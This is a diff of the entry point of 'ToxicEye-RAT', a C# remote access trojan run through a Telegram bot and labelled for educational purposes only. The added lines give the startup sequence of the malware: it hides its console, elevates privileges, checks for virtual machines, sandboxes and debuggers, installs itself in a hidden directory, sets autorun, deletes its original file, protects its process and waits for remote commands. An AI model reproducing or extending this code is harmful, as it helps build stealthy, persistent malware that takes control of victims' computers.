@@ -1,9 +1,9 @@
 ﻿/* 
-       │ Author       : LimerBoy
-       │ Name         : ToxicEye
-       │ Contact Me   : https:github.com/LimerBoy
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https:github.com/LimerBoy
 
-       This program is distributed for educational purposes only.
+       > This program is distributed for educational purposes only.
 */
 
 
@@ -17,20 +17,29 @@ namespace TelegramRAT
         [STAThreadAttribute]
         static void Main(string[] args)
         {
-            // SSL
-            ServicePointManager.SecurityProtocol = (
-                SecurityProtocolType.Ssl3  |
-                SecurityProtocolType.Tls   |
-                SecurityProtocolType.Tls11 |
-                SecurityProtocolType.Tls12
-            );
-
+            // Hide console
+            persistence.HideConsoleWindow();
+            // Mutex check
+            persistence.CheckMutex();
             // Get admin rights
             persistence.elevatePrevileges();
+            // Delay before starting
+            persistence.Sleep();
+            // Check if on VirtualBox, Sandbox or Debugger
+            persistence.runAntiAnalysis();
             // Install to system & hide directory
             persistence.installSelf();
             // Add to startup
             persistence.setAutorun();
+            // SSL
+            ServicePointManager.SecurityProtocol = (
+                SecurityProtocolType.Ssl3 |
+                SecurityProtocolType.Tls |
+                SecurityProtocolType.Tls11 |
+                SecurityProtocolType.Tls12
+            );
+            // Delete file after first start
+            persistence.MeltFile();
             // Check internet connection
             utils.isConnectedToInternet();
             // Send 'online' to telegram bot
@@ -41,7 +50,10 @@ namespace TelegramRAT
             persistence.protectProcess();
             persistence.PreventSleep();
             // Wait for new commands
-            telegram.waitCommands();
+            telegram.waitCommandsThread.Start();
+            // Need for system power events
+            var shutdownForm = new persistence.MainForm();
+            System.Windows.Forms.Application.Run(shutdownForm);
         }
     }
 }
